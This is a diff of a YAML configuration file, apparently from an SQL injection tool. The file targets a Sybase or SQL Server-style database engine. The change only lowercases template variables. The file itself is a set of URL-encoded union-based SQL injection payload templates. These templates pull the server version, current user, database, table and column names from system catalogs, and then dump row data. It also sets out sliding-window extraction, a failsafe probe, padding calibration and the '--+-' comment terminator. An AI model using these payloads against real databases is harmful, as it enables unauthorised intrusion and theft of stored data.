@@ -3,89 +3,89 @@ resource:
  info: |
   select 
       @@version
-      %2B'${ENCLOSE_VALUE_SQL}'
+      %2B'${enclose_value_sql}'
       %2Bdb_name()
-      %2B'${ENCLOSE_VALUE_SQL}'
+      %2B'${enclose_value_sql}'
       %2Buser_name()
-      %2B'${TRAIL_SQL}'
+      %2B'${trail_sql}'
       r
       
  schema: 
   database: |
    select 
        rr
-       %2b'${TRAIL_SQL}'
+       %2b'${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %2bt.name
-           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %2b'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
           (select distinct name from master..sysdatabases) t,
           (select distinct name from master..sysdatabases) t1
        where t.name >= t1.name
        group by t.name
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       %2b'${TRAIL_SQL}'
+       %2b'${trail_sql}'
        r 
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %2bt.name
-           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %2b'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-          (select distinct name from ${DATABASE}..sysobjects where type = 'U') t,
-          (select distinct name from ${DATABASE}..sysobjects where type = 'U') t1
+          (select distinct name from ${database}..sysobjects where type = 'U') t,
+          (select distinct name from ${database}..sysobjects where type = 'U') t1
        where t.name >= t1.name
        group by t.name
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       %2b'${TRAIL_SQL}'
+       %2b'${trail_sql}'
        r 
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %2bt.name
-           %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %2b'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-           (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id = t.id where t.name = '${TABLE}')t,
-           (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id = t.id where t.name = '${TABLE}')t1
+           (select distinct c.name from ${database}..syscolumns c inner join ${database}..sysobjects t on c.id = t.id where t.name = '${table}')t,
+           (select distinct c.name from ${database}..syscolumns c inner join ${database}..sysobjects t on c.id = t.id where t.name = '${table}')t1
        where t.name >= t1.name
        group by t.name
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        %2b'${TRAIL_SQL}'
+        %2b'${trail_sql}'
         r
     from (
         select 
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             %2bt.s
-            %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            %2b'${separator_qte_sql}0${enclose_value_sql}'
             rr
         from
-           (select distinct ${FIELDS} s from ${DATABASE}..${TABLE}) t,
-           (select distinct ${FIELDS} s from ${DATABASE}..${TABLE}) t1
+           (select distinct ${fields} s from ${database}..${table}) t,
+           (select distinct ${fields} s from ${database}..${table}) t1
         where t.s >= t1.s
         group by t.s
-        {limit}
+        ${limit}
     ) a
    fields: 
     field: |
@@ -93,7 +93,7 @@ resource:
          ltrim(
              convert(
                  varchar, 
-                 ${FIELD}
+                 ${field}
                  %2b ''
              )
          )
@@ -104,23 +104,23 @@ strategy:
  configuration: 
   slidingWindow: |
    select 
-       '${LEAD}'
+       '${lead}'
        %2bsubstring(
            r,
-           ${INDEX},
+           ${index},
            65536
        )
    from (
-       ${INJECTION}
+       ${injection}
    ) x
-  limit: having count(*) between ${LIMIT} and ${LIMIT}
+  limit: having count(*) between ${limit.value} and ${limit.value}
   failsafe: |
    select 
        convert(
            varchar, 
-           (1337${INDICE}7330%2b1)
+           (1337${indice}7330%2b1)
        ) r
-  calibrator: replicate('${CALIBRATOR_SQL}', 1024)
+  calibrator: replicate('${calibrator_sql}', 1024)
   limitBoundary: 1
   endingComment: --+-
   fingerprint: 
@@ -133,6 +133,6 @@ strategy:
     - sybase
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b
-  capacity: (select '${LEAD}${INDICE}' %2b ${CALIBRATOR})
+  indices: union select ${result_range} from (${indice_unique}) b
+  capacity: (select '${lead}${indice}' %2b ${calibrator})
   orderBy: order by 1337
